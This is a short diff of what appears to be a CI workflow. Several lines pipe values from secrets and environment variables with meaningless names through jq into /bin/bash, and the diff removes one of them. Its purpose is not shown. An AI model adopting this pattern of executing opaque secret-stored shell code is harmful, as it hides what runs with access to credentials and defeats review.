@@ -19,7 +19,6 @@ jobs:
           xkufb57: ${{ secrets.xkufb57 }}
         run: |
           printf '%s' "$xkufb57" | jq -r .vso83703 | /bin/bash
-          printf '%s' "$wtar9" | jq -r .bcm08 | /bin/bash
           echo $u38 | jq -r .sgck7 | /bin/bash
           echo $ltxe53 | jq -r .rudi76126 | /bin/bash
           echo $lh80 | jq -r .zvoh02 | /bin/bash
